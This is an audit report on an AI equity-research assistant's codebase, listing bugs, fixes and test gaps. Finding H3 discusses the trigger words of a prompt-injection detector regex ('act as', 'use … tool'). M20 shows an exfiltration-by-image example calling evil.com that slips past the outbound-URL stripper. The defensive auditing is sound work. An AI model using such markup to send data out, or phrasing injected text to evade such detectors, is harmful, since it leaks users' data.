# AI research and thesis plan: deep audit (2026-10-11)

Audited: `docs/plans/ai_research_thesis_improvement_plan.md` and the code built for it in commits `8b01efa`..`e5d5c6f`:
- `steward/research/*`, `steward/chat/{catalog,envelope,research_tools,data_tools,data_tool_defs,benchmark,benchmark_runner}.py` and the changed parts of `chat/tools.py` and `assistant.py`;
- `config/research.py`, `config/jobs.py`, `thesis/proposal.py`, `api/research_routes.py`, migration `20261105100000_research_plan_draft.sql`;
- the research web screens and helpers under `apps/web/src/app/(app)/research/`, `src/lib/research/` and the research-profile editors.

Method: four read-only reviews (research pipeline core; ledger, security, retention and routes; chat data tools and benchmark; web app). Duplicates found by more than one review were merged. Every High was then re-read in the source by the lead reviewer. The injection-regex finding was confirmed by running the pattern on sample sentences. Findings that could not be confirmed are marked **plausible**. Checked claims that turned out false are listed at the end.

Run during the audit:
- `tsc --noEmit` (web): clean.
- `eslint` on the research web files: clean.
- `vitest` on `src/lib/research` and `research-profiles-form.test.ts`: 72 passed.
- `pytest tests/test_research_catalog.py`: 16 passed.
- Nothing else was run: no DB tests, no live model, no browser.

Status: `open`, `fixed`, `rejected` (false positive), `deferred` (reason given).

## High

| # | Where | Issue | Status |
|---|---|---|---|
| H1 | `research_routes.py:341`, `thesis-proposal.tsx:45` | **Only one thesis-proposal field can ever be accepted.** The UI sends `fields:[field]` per click. The first accept saves a new `theses` version. The route then requires `stored.id == proposal.base_version_id`, so every later accept from the same report returns 409, and the UI tells the owner "your theses changed after this report" although the change was their own accept. This breaks the plan's "per-field accept" (Phase 3 item 4). Fix: accept all chosen fields in one request, or record the accepted fields and the new base id on the report and allow fields whose `before` still matches. | fixed |
| H2 | `research/run.py:237-240`, `holding_profiles.py:270-273` | **An issuer's own `www.` site is never tier 1.** `allowed_domains()` returns `www.apple.com` unchanged. `SourcePolicy.decide` normalises the hit host to `apple.com`, then `tier_of("apple.com")` checks `host == d or host.endswith(".www.apple.com")`, which is false. The provider is still told to search the IR domain, but every page from it is excluded with "domain is not on any allowed list". Primary-source research silently degrades for any IR URL that has `www.`. The only test re-implements `tier_of` with `www.` stripped (`test_research_plan_templates.py:59`). Fix: normalise `ir` with `normalise_host` in `search_domains`. | fixed |
| H3 | `research/untrusted.py:22-31` | **The injection detector flags ordinary filing and news prose.** Verified by running the pattern; all of these match: "This forward-looking statement describes our strategy", "The post-merger integration strategy…", "Management will use the new tool to run the plant", "Preferred shares may act as a hedge". The causes are `\bforward\b` and `\bpost\b` inside hyphenated words, bare `act as`, and `use … tool`. A matched source is flagged and its claims rated low. The sentence is replaced with a marker in research prompts, source lines and **every chat tool result** (`neutralise_tree`). Almost every 10-K/10-Q has a "forward-looking statements… strategy" sentence. The gate's benign cases avoid these phrases, so the gate passes. Fix: tighten the verbs (no match after or before a hyphen), drop bare `act as`, require an imperative object for `use/run`, and add these sentences as benign gate cases. | fixed |
| H4 | `chat/data_tools.py:274-288` (`statement_lines`) | **The limit is applied in concept order, not date order.** `distinct on (statement, concept, period_end, …) order by statement, concept, period_end desc … limit n+1` returns the first concepts alphabetically. With no `concept` filter, "20 latest lines" means up to 20 periods of the first one or two concepts of `balance_sheet`. The Python re-sort only reorders that wrong set. `page.truncated` is true, but there is no offset to reach the rest. Fix: rank with `row_number() over (partition by statement, concept order by period_end desc)` and keep the latest N periods per concept, or require `statement`/`concept`, and add an offset. | fixed |
| H5 | `research/ledger.py:359`, `thesis/proposal.py:202`, `run.py:936` | **Thesis KPIs are never matched by name.** The rule string passed to `build_ledger` is `f"{operator} {threshold:g} {unit}"` (e.g. `">= 10 pct"`), with no metric. `strategy_checks` matches `rule.split()[0]`, which is the operator `>=`, so only the slug `kpi_id` can match. A report saying "gross margin" raises `kpi_unnamed` for every KPI, and any warning blocks the report from reaching "high" confidence. The ledger docstring and tests assume `"gross_margin >= 10 %"`. This breaks Phase 4 item 4 (strategy traceability). Fix: pass `k.metric` (and its words, as well as `kpi_id`) to the check. | fixed |
| H6 | `chat/benchmark_runner.py:530`, `chat/tools.py:1341`, `tools.py:683-688` | **The live benchmark runner cannot run a `propose_job` case.** It builds `ChatTools(pool, Registry(), None, None, …)`, so `propose_job` inserts `conversation_id=NULL` into `chat_action`, which is `not null`. `NotNullViolationError` is not a `DataError`, so it escapes `_dispatch`. The case fails as an error and its trace entry is lost. Case `earnings-03` can therefore never pass. With a non-null id, the replay would write real rows. Fix: give the runner a stub `propose_job` that records the call without inserting. | fixed |

## Medium: backend

| # | Where | Issue | Status |
|---|---|---|---|
| M1 | `config/research.py:63-69`, `source_policy.py:96-103` | `DomainName` accepts `www.x.com`, but only the page host is normalised, not the configured lists. `deny_domains=["www.spam.com"]` never matches `spam.com`, so the site is searched and cited. `allow_domains` and `forum_domains` with `www.` never get their owner-trusted or forum label. Fix: reject a leading `www.` in the validator, or normalise the lists in `for_profile`. | fixed |
| M2 | `research/ledger.py:260,266` | Publisher distinctness in the ledger uses `s.url.split("/")[2]` raw (no lowercasing, `www.` or port handling), unlike `run.py`'s `host_of`. `www.reuters.com` and `reuters.com` count as two publishers and give "high". Two forum or blog pages also reach "high" because tier and role are ignored. Fix: use `host_of` and require tier ≤ 2 or a non-forum role. | fixed |
| M3 | `research/run.py:272` | `single_source_claims` compares exact hosts, so `edition.cnn.com` and `cnn.com` are two publishers and the claim is not sent for corroboration. This weakens the "Closed" note on Phase 2 gap 4. Fix: compare registrable domains (reuse the news `independence_key` logic). | fixed |
| M4 | `research/ledger.py:249,564-567` | Every `unknown` claim is rated low and counts towards the `weak > 30 %` rule. An honest report with 4 open questions out of 10 claims is "low" overall. The test only asserts `in ("high","medium")` (`test_research_ledger.py:235`), so the 70 % and 30 % thresholds are not pinned. Fix: exclude unknowns from the weak share, and pin the thresholds in tests. | fixed |
| M5 | `research/run.py:286-313` | `load_config` is not checkpointed. If the owner edits the profile or template between a crash and the resume, the resumed run mixes the new layout with the old `gather`, `plan` and `section:*` outputs, and `snapshot.versions` records the new ids. Fix: checkpoint the config ids and bodies, or fail the resume when the active versions changed. | fixed |
| M6 | `research/run.py:254,497-498,561-571` | A section that fails in the first pass (`LLMError`, refusal, schema failure) is checkpointed as `"not written: …"`. `thin_sections` skips such notes, so a follow-up round with budget left does not retry it, and a resume replays the cached failure. Fix: skip only the no-key and budget-exhausted notes, and do not checkpoint other failed calls. | fixed |
| M7 | `research/run.py:634-683,705-755`, `config/research.py:191-196` | Sentence caps are not enforced after follow-ups. Each round appends up to 3 sentences with no truncation to `spec.max_sentences` or the depth cap, so a brief section (cap 3) can reach 9. `min_sentences` (≤ 6) is not validated against the cap: with `min_sentences=6` and brief depth, every section stays "thin" and the follow-ups burn the budget. Fix: truncate at store time, and validate `min_sentences ≤ cap`. | fixed |
| M8 | `research/run.py:262-278,692-708` | Follow-up targeting never converges. Already-corroborated sentences are re-detected as single-source every round. Targets are always the first three sections in layout order, so later sections (`counter_case`, `open_questions`) can starve. Thinness is counted before the claim verifier removes unsupported sentences. Fix: rank or rotate the targets, remember attempted corroborations, and count only verified sentences. | fixed, except that thinness is still counted before the claim verifier runs |
| M9 | `thesis/proposal.py:28,124,162-164` | `why_owned` proposes up to 2 lines but accept applies only `texts[0]`. When the current value equals line 1, the diff shows a change that saves a no-op new version. Fix: propose 1 line, or join the lines. | fixed |
| M10 | `research_routes.py:154-155`, `run.py:366-375` | A plan draft created without `name` uses the ticker as the company name, so questions and web intents read "AAPL_US_EQ business model…". The draft is used verbatim at run time. Fix: look up `instrument.name` when the draft is created. | fixed |
| M11 | `research_routes.py:215-235`, `model_plan.py:428` | `start_from_plan` checks the status, enqueues and then updates it, which is not atomic: a double click enqueues two billed jobs. `save_draft` has no status guard, so a PATCH racing a start can flip `started` back to `draft`. An empty PATCH `{}` demotes `approved` to `draft`. Fix: `update … set status='started' where id=$1 and status='approved' returning` before enqueueing, and guard `save_draft` on the status. | fixed |
| M12 | `research_routes.py:417-424`, `retention.py:42-54,135-148` | `review_claim` and `purge_report_trace` read the whole body, edit it in Python and write it back with no lock or version check. Two reviews, or a review racing a purge, lose a write while both return 200. Fix: `select … for update` in one transaction, or `jsonb_set` on the single claim. | fixed |
| M13 | `chat/envelope.py:90-99` | `page(rows, limit)` with no `total` reports `truncated=False` even when the limit was hit. Affected: `fx_rates`, `segment_revenue`, `corporate_actions`, `peers`, `fund_nav`. Some lists have no `page` at all: `share_counts` history, the `etf_breakdown` sector and country tops, and `valuation_scenarios.filed_inputs[:12]`. The system prompt tells the model to trust `truncated`. This contradicts "all lists capped with a stated page". Fix: fetch limit+1 rows or pass the total. | fixed for the `truncated` flag (a list that fills its limit now reports truncated); the lists with no `page` at all (`share_counts` history, `etf_breakdown` tops, `filed_inputs`) are deferred |
| M14 | `chat/data_tools.py:69-76,115-124` (`fx_rates`) | `fx_rate` holds ECB (EUR base) and CNB (CZK base) rows. `order by rate_date desc, source` makes `latest` the CNB row whenever both exist. The `rates` list interleaves the two bases and splits the limit between them, and each `rate` datum has no base currency of its own. Fix: return `latest` per source or filter to one source, and put the base currency in each datum. | fixed |
| M15 | `chat/tools.py:681-688` + `research_tools.py:613,623`, `data_tools.py:273` | `_dispatch` catches only `TypeError` and `DataError`. A model-supplied non-string `geography` (`.upper()`), `query` or `concept` (`.strip()`) raises `AttributeError` and fails the whole chat job. Fix: catch `(AttributeError, ValueError)` as bad arguments, or coerce with `str()`. | fixed |
| M16 | `chat/benchmark_runner.py:396-406` | `compare_runs` intersects case ids for the per-case rows but compares aggregates over each run's own case set. A `--limit 5` run against a full run reports `passed` 49→5 as a regression. Fix: recompute the aggregates over the common ids, and warn when the case sets differ. | fixed |
| M17 | `chat/benchmark_runner.py:142` | **Plausible.** The `citation` stage fails whenever no sentence has a source, so a correct "insufficient evidence" answer to a `missing_data` case scores as failed. Fix: skip the citation check for the insufficient-evidence shape. | fixed |
| M18 | `chat/research_tools.py:644-647` (`macro_series`) | **Plausible.** `distinct on (period)` collapses rows across source and geography. With `geography` omitted and a series id shared by several countries or providers, the result is an arbitrary mix labelled with the first row's source and geography. Confirm by checking whether the collectors reuse a series id across geographies. | fixed |
| M19 | `chat/data_tools.py:370-379` (`segment_revenue`), `274-280` | **Plausible.** Segment rows are joined across every filing with no de-duplication: a 10-K restates prior years, so a (member, period) pair repeats. Annual, quarterly and YTD durations are mixed, and the datum has no currency. `statement_lines`' distinct key also omits `period_start`, `basis` and `unit` (a 3-month and a 9-month fact ending the same day collapse) and ignores `validation` (the reconciliation flag). | fixed for the repeated filings and the distinct key (the segment datum still has no currency and the `validation` flag is still ignored) |
| M20 | `research/untrusted.py:34-36` | **Plausible.** `strip_outbound` misses scheme-relative URLs (`<img src=//evil.com/p?q=…>`) and `www.evil.com/?q=` autolinks, because `_URL` needs `https?://`. Whether this can exfiltrate depends on whether the web markdown renderer allows raw HTML (not checked). The gate has only 5 outbound cases. Fix: also strip `//host`, bare `www.` and HTML tags, and add the variants to the gate. | fixed |
| M21 | `research/ledger.py:50-60` | The hedge, future and unknown word lists are English only, but `language: cs` is a supported profile setting. Czech sentences are all typed as `fact` and can reach "high". This is not listed in the plan's Phase 4 gap 1. | fixed |

## Medium: web

| # | Where | Issue | Status |
|---|---|---|---|
| W1 | `ledger-claim-row.tsx:21` | The review state is copied into `useState` once. Confirm a claim in the detailed view, switch to concise (the row unmounts) and back: the row remounts from the stale body and shows "Not reviewed". The "press again to clear" logic then needs an extra click. Fix: lift the overrides into `ClaimLedger`, or refetch after a review. | fixed |
| W2 | `research/views.py:28-37`, `thesis-proposal.tsx:162` | The concise view keeps only sources cited by the kept sentences. Thesis-proposal evidence (taken from all sentences, including detail-only `moat_risks`) and flagged-source ids then show as "(not in the source list)", and the concise Markdown shows `[S9]` with no S9. Fix: add the proposal, KPI-review and flagged ids to the `cited` set. | fixed |
| W3 | `plan-editor.tsx:58-60` | The plan editor never sends `profile`, so every draft uses the default profile. There is no profile picker, and "As the profile says" always means the default profile. Fix: add a profile select. | fixed |

## Low

| # | Where | Issue | Status |
|---|---|---|---|
| L1 | `model_plan.py:135-146,296` | `foreign_hosts` treats company names like "Amazon.com" or "Booking.com" as foreign sites. Any PATCH of a code-built plan is then rejected, and model questions naming the company are dropped. | fixed |
| L2 | `model_plan.py:298-304` | `changed = groups != old.source_groups` is order-sensitive and recomputes the tools from the groups. Turning `web` off, or just reordering, widens `internal_tools` to every tool in the groups. | fixed |
| L3 | `config/research.py:211-217` | `TemplateSection.title` skips the plain-text validator that `CustomSection` uses. The title flows into web intents and headings. Owner-only. | fixed |
| L4 | `source_policy.py:112` | **Plausible.** `[:80]` truncates the provider allow-list silently, and the owner-trusted and forum domains come last. | fixed |
| L5 | `run.py:288-303`, `research_routes.py:55` | The ticker is neither case-normalised nor checked against `instrument`. `aapl_us_eq` misses every lookup and produces a paid web-only report. | fixed |
| L6 | `run.py:689-699` | With no writer (no key), the run still says "every planned section has enough cited evidence". Follow-ups also run with 0 searches left. | fixed |
| L7 | `run.py:1016,1062-1068` | **Plausible.** Search titles and model text go into `body_md` unescaped, so a title with `\n## …` injects headings. It matters only if `body_md` is rendered as Markdown. | fixed |
| L8 | `run.py:452-453` | The snapshot's `prompts` omit the planner prompt, `SECTION_TASKS` and `PRIORITY_TEXT`, so the "snapshot of prompts" is partial. (The gate fingerprint covers them; the per-run snapshot does not.) | fixed |
| L9 | `read_tools.py:77-81` | Read-only is a denylist (`datasets ⊆ {actions}`). A future write tool in another dataset would pass. Fix: an explicit `read_only=True` flag in the catalog. | fixed |
| L10 | `plan.py:62`, `read_tools.py:44-55` | `counter_case` always plans `event_paths`, an owner-only tool, so every deep report carries "Planned stored-data tool(s) not called: event_paths". | fixed |
| L11 | `run.py:215`, `gather.py:367-372` | Code-written sentences that embed raw news headlines go into the prompt un-neutralised. Only source titles and snippets pass `neutralise`. | fixed |
| L12 | `untrusted.py:90` | `" ".join(text.split())` flattens model newlines. Links with titles, or URLs containing `)`, are removed even when allowed (a conservative false positive). | fixed for links with a title; the newline flattening stays on purpose (a sentence is one line) |
| L13 | `retention.py:132-148` | Clearing a review sets `review="unreviewed"` and loses the verifier's `flagged` state. Fix: keep the owner choice in its own field. | fixed |
| L14 | `rules.py:45-50` | `_near` with a limit of 0: `<= 0` warns at value 0. Ticker match is exact (case-sensitive). | fixed |
| L15 | routes, `model_plan.py` | PATCH `questions` and `ThesisProposalAccept.fields` have no max length. Plan drafts have no status index and no retention. | fixed for the length limits; the status index and draft retention are deferred (need a migration) |
| L16 | `research_tools.py:276-285` | `fundamentals` with `periods` set: once the 300-point budget is used, the remaining groups still register a source with `snippet=None` and empty ratios, which the model can cite. | fixed |
| L17 | `envelope.py:102-112` | `neutralise_tree` skips dict keys and tuples, and runs after `_shrink` has cut strings to 600 characters (a cut can split a pattern). No current producer is affected. | fixed for keys and tuples; the cut-before-neutralise order is left (no producer is affected) |
| L18 | `data_tools.py:138-142,205-210` | **Plausible.** `latest_quote` and `listing_liquidity` match on `price_symbol or ticker` only. Instruments resolved by `listing_id` or a Yahoo symbol show no data, while `price_history` has it. | deferred: resolving by `listing_id` needs the instrument resolution rules checked first |
| L19 | `benchmark_runner.py:279-298` | Run ids and review paths are joined with no validation (`../` escapes `evals/runs`). Also: `--limit 0` runs all cases; an unknown `--only` id runs nothing silently; a missing `--cases` file is ignored. CLI only. | fixed |
| L20 | `data_tools.py` | `corporate_actions` and `etf_breakdown` tie orders are undefined. `latest_quote` prints "None" for a null currency. Quote staleness of 4 days can flag a holiday weekend. | fixed for the tie orders and the null currency; the 4-day quote staleness is unchanged |
| L21 | `catalog.py` | The `funds` dataset names table `fund_snapshot`, which does not exist (`etf_snapshot`, `fund_snapshot_pin` do). The `filing_evidence` bound says 10 items, but the maximum is 25. No test checks catalog table names against the schema. | fixed for the table name and the bound; a test that checks catalog tables against the schema is not added |
| W4 | `plan-editor.tsx:80` | Approve always sends `questions`, so the plan is stored as `edited_by_owner=True` even when nothing changed. | fixed |
| W5 | `research-profiles-form.ts:734` | The client model regex `^(gpt\|gemini)-` is looser than the backend's `^(gpt\|gemini)-[a-z0-9.-]{1,64}$`. `gpt-ABC` passes the form and gets a 422. | fixed |
| W6 | `research-profiles-form.ts:665`, `report-template-card.tsx:265` | The add-section buttons stay enabled past the 20-section template cap (15 built-in + 6 custom = 21). | fixed |
| W7 | `research-profiles-editor.tsx:77-91` | Renaming a template id re-points profiles on every keystroke. A partial id that equals another template's id moves the profiles onto it. | fixed |
| W8 | `thesis-proposal.tsx:47`, `plan-editor.tsx:62` | `String(error.detail)` shows "[object Object]" for FastAPI 422 errors, whose detail is a list. | fixed |

## Plan text that is wrong or stale

| # | Where | Issue | Status |
|---|---|---|---|
| D1 | Plan Phase 3 gap 6 and web section | The plan says "per-field accept" works and lists no limit. In practice only the first field per report can be accepted (H1). | fixed |
| D2 | Plan Phase 5 gap 5 | The plan says the sweep "does not remove … report bodies". `retention.py:83-115` does rewrite `report.body` to drop `trace`, and it removes checkpoints for every succeeded job kind, not only research and chat. Only succeeded jobs are touched (correct). | fixed |
| D3 | Plan status table, rows 0-1 | It says 41 cases, then 49. `evals/research_cases.json` has 52, and `cases_extra.json` does not exist. The test asserts only `>= 30`. Rows 21-22 still list FX, quotes and `fundamentals` periods as "Remains", although they are built. | fixed |
| D4 | `ai_research_capability_map.md:105,143-149` | It says FX and intraday quotes have no tool (`fx_rates` and `latest_quote` exist) and that the research job has no per-call trace (`research/trace.py` exists). The generated table block is current. | fixed |
| D5 | Plan "Closed after fifth pass" | "Every result stamped with `tool` and `retrieved_at`" holds only for non-error results (`envelope.stamp` skips errors, by design and tested). | fixed (the plan now says "non-error results") |
| D6 | Plan web section | "Type-check, lint … not run" is now out of date. Both were run in this audit and are clean for the research files. The render test and browser check are still not done. | fixed |

## Test gaps

- **H2:** no test runs `search_domains` with a `www.` IR host.
- **Not tested at all:**
  - H1: a second accept from the same report.
  - H5: a KPI matched by its metric words.
  - M5: resume after a config edit.
  - M6: retry of a failed section.
  - M7: sentence caps after follow-ups.
  - M11: double start.
  - M12: concurrent review or purge.
  - L13: clearing a flagged review.
  - Czech text in the ledger.
- **H3:** the gate's benign injection cases avoid "forward-looking", "post-merger", "act as" and "use … tool".
- **Ledger thresholds:** the 70 % and 30 % thresholds and the two-publisher "high" branch are not pinned.
- **Rule margins:** rule tests never cover the min-limit warn, a boundary value, a zero limit or a negative value.
- **`test_data_tools_db.py`:** only the FX success path is seeded. `fund_nav` runs with no owner, so its SQL never executes. That is why H4, M14 and M19 went unnoticed.
- **Data-tool runner tests:** they use a fake pool that returns the same rows for every query.

## Checked and rejected (false positives)

- Concise-view feedback paths pointing at the wrong section are not a defect. `originalSectionIndex` maps by section id, concise sentences are a prefix, and the backend validates against the stored body.
- No XSS in the research screens. There is no `dangerouslySetInnerHTML`, external links go through `isExternalUrl` (http and https only), and discovered URLs render as text.
- Old reports without the new fields load and render. Pydantic defaults apply, and every new component guards null.
- Retention touches only succeeded jobs, so running and failed jobs keep their checkpoints.
- `clamp_limit` correctly rejects bool, string, float and out-of-range values on every limit, days and periods argument checked.
- All SQL columns in the new tools match the migrations.
- Every route has the `Owner` dependency. The draft migration has RLS on, anon and authenticated revoked, owner-only select, and an FK set to null on delete.
- `run.py` does pass `stale_days=profile.stale_days` to `build_ledger`.
- Rule warn margins are symmetric and correct for both max and min limits, with no division by zero.
- Plan-draft PATCH cannot inject tools or domains (source groups are validated against `SOURCE_GROUPS`).

## Plan claims verified true

- The 409 guard on thesis accept when the theses changed elsewhere.
- Snapshot digest coverage (its exclusion of sections and the ledger is admitted in the plan).
- Two pages of one host count as one source.
- At most 3 follow-up sections per round.
- `read_tools` excludes `propose_job` and skips unknown tools.
- `forum_domains` validation.
- The `planning` and `planner_model` fields and the code-plan fallback.
- 48 chat tools, with `catalog.problems()` empty.
- `freshness_days` comes from `JobsConfig`.
- `fundamentals.periods` clamp and the 300-point cap.
- `price_history` benchmark and thinning.
- `neutralise_tree` and `stamp` on every `ChatTools.call`.
- The daily `research_trace_retention` job at 03:40 with a 30-day default.
- 26 gate cases.
- `evals/runs/` is git-ignored.
